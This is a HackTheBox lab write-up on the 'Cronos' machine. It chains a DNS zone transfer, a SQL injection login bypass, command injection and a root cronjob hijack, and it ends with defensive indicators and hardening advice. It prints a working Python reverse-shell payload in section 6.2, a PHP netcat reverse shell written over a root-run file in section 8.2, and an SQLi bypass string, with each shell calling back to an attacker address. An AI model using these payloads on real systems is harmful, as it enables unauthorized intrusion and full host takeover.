# Cronos - Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Medium` \
> **Date:** 2026-03-07 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only \

---

## 0. Executive Summary

The "Cronos" machine was compromised via a chain of four distinct vulnerabilities. A misconfigured DNS server allowed a full zone transfer, revealing a hidden admin subdomain. The admin panel was bypassed using SQL injection authentication bypass. A network tool exposed to authenticated users was vulnerable to command injection, yielding a reverse shell as `www-data`. Finally, a root-owned cronjob executing a file writable by `www-data` was hijacked to achieve full system compromise. Immediate remediation of DNS zone transfer permissions, input sanitization, and cron job file permissions are recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"Cronos"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined
in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → DNS Zone Transfer → admin.cronos.htb → SQLi Auth Bypass → Command Injection → www-data shell → Root Cronjob Hijack → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `dig` | DNS zone transfer enumeration |
| `curl` | Web request testing |
| `netcat` | Reverse shell listener |
| `python3` | Shell stabilization |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -p- -Pn -T4 10.129.227.211
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu | Potential post-exploitation access |
| 53/tcp | DNS | ISC BIND 9.10.3-P4 | ⚠️ DNS running — zone transfer candidate |
| 80/tcp | HTTP | Apache httpd 2.4.18 | Default Apache page |

**Key Observations:**
- Port 53 open — DNS service running, immediate zone transfer attempt warranted
- Port 80 shows default Apache page — real content likely behind virtual hosts
- `-Pn` required — host blocking ICMP ping probes

---

## 5. Service Enumeration

### 5.1 DNS Enumeration

**Tools Used:** `dig`

**Commands:**
```bash
# Add base domain to hosts
echo "10.129.227.211 cronos.htb" | sudo tee -a /etc/hosts

# Attempt zone transfer
dig axfr cronos.htb @10.129.227.211
```

**Findings:**

| Subdomain | Type | Notes |
|-----------|------|-------|
| `cronos.htb` | A | Main domain |
| `admin.cronos.htb` | A | ⚠️ Hidden admin panel |
| `ns1.cronos.htb` | A | DNS server |
| `www.cronos.htb` | A | WWW alias |

**Key Finding:** Zone transfer succeeded — DNS server was publicly exposing all internal records. `admin.cronos.htb` was discovered, which would not appear on the main site or in standard wordlists.

### 5.2 Web Enumeration

After adding `admin.cronos.htb` to `/etc/hosts`, navigating to `http://admin.cronos.htb` revealed a custom PHP login panel titled "Login Page".

---

## 6. Initial Access

### 6.1 Vulnerability 1 — SQL Injection Authentication Bypass

**Vulnerability:** SQL Injection in login form \
**Location:** `http://admin.cronos.htb` \
**Reasoning:** The login form was passing user input directly into a SQL query without sanitization. Injecting a comment sequence into the username field terminated the password check entirely.

```
Username: admin' -- -
Password: anything
```

This transforms the backend query into:
```sql
SELECT * FROM users WHERE username='admin' -- -' AND password='anything'
```

The `-- -` comments out the password verification, granting access as admin.

**Result:** Authenticated access to admin panel — "Net Tool v0.1"

### 6.2 Vulnerability 2 — Command Injection

**Vulnerability:** Unsanitized user input passed to shell commands \
**Location:** Net Tool v0.1 — host input field \
**Reasoning:** The tool executed `ping` and `traceroute` with user-supplied input directly in a shell context, allowing command chaining via `;`.

**Verification:**
```
host field: 8.8.8.8; whoami
# Output: www-data
```

**Exploitation:**
```bash
# Listener on attacker machine
nc -lvnp 4444

# Payload in host field
8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Result:** Reverse shell obtained as `www-data`. User flag located at `/home/noulis/user.txt`.

---

## 7. Lateral Movement

Not applicable — `www-data` had direct access to the user flag and sufficient permissions for privilege escalation without requiring lateral movement to another user account.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — failed, password unknown
- [x] `cat /etc/crontab` — critical finding

**Key Findings:**
```
* * * * *   root    php /var/www/laravel/artisan schedule:run
```

Root executes `/var/www/laravel/artisan` every minute via cron. File is owned by `www-data` — fully writable by our current user.

### 8.2 Escalation Vector

**Vector:** Root cronjob executing a PHP file writable by www-data \
**Root Cause:** The Laravel artisan file was owned by the web server user (`www-data`) rather than root, while being executed with root privileges every minute. No integrity verification in place.

```bash
# Overwrite artisan with PHP reverse shell
echo '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 5555 >/tmp/f"); ?>' > /var/www/laravel/artisan

# Listener on attacker machine
nc -lvnp 5555

# Wait up to 60 seconds for cron to execute
```

**Result:** Root shell obtained when cron executed the hijacked artisan file.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | DNS Zone Transfer publicly accessible | 🔴 Critical | Port 53 / BIND config |
| 2 | SQL Injection authentication bypass | 🔴 Critical | `admin.cronos.htb` login |
| 3 | Command injection in network tool | 🔴 Critical | Net Tool v0.1 host field |
| 4 | Root cronjob executing www-data writable file | 🔴 Critical | `/var/www/laravel/artisan` |
| 5 | Hidden admin panel exposed via DNS | 🟠 High | `admin.cronos.htb` |

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- `dig axfr` queries against the DNS server in logs
- Unusual SQL patterns in web server logs (`' -- -`, `OR 1=1`)
- Outbound connections from `www-data` process to unknown IPs
- Modification timestamp change on `/var/www/laravel/artisan`
- Unexpected reverse shell processes spawned by cron as root

### 10.2 Security Weaknesses

- DNS zone transfer permitted from any source — full internal DNS exposed
- Login form vulnerable to SQL injection — no input sanitization or parameterized queries
- Network tool passing user input directly to shell — no allowlist or sanitization
- Root cron job executing files owned by unprivileged service account

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Restrict zone transfers to authorized secondary DNS servers only | Finding 1 |
| Immediate | Implement parameterized queries / prepared statements in login form | Finding 2 |
| Immediate | Sanitize or remove the network tool — never pass user input to shell | Finding 3 |
| Immediate | Ensure root-executed cron scripts are owned and writable only by root | Finding 4 |
| Short-term | Move admin panel behind VPN or IP allowlist | Finding 5 |
| Short-term | Implement WAF rules for SQLi and command injection patterns | Findings 2-3 |
| Long-term | Regular security audits of cron jobs and their file permission chains | Finding 4 |

---

## 11. Lessons Learned

- **Port 53 is an attack surface** — DNS is rarely thought of as a vulnerability but a misconfigured zone transfer hands you the entire internal subdomain structure instantly. Always check for it when port 53 is open.
- **DNS beats ffuf for subdomain discovery** — zone transfer revealed `admin.cronos.htb` in milliseconds. Brute force wordlists might have found it too, but zone transfer is always the first move.
- **SQLi auth bypass is still alive and well** — `admin' -- -` is one of the oldest tricks in the book and it still works on unparameterized queries in 2024. Never trust user input in SQL context.
- **Command injection follows predictable patterns** — any input field that feeds into a system command is a candidate. The semicolon chain `; whoami` is always worth testing first.
- **Cronjob hijacking is a recurring privesc theme** — Bashed used it, Cronos used it. The pattern is always: find what root runs automatically → check if we can write to it → replace it. This will keep appearing in real pentests.
- **Medium doesn't always mean harder** — sometimes it just means more steps. Strong enumeration instincts make "medium" boxes feel like "easy" ones.

---

*End of Report* \
*Classification: Public — flags and sensitive values omitted*
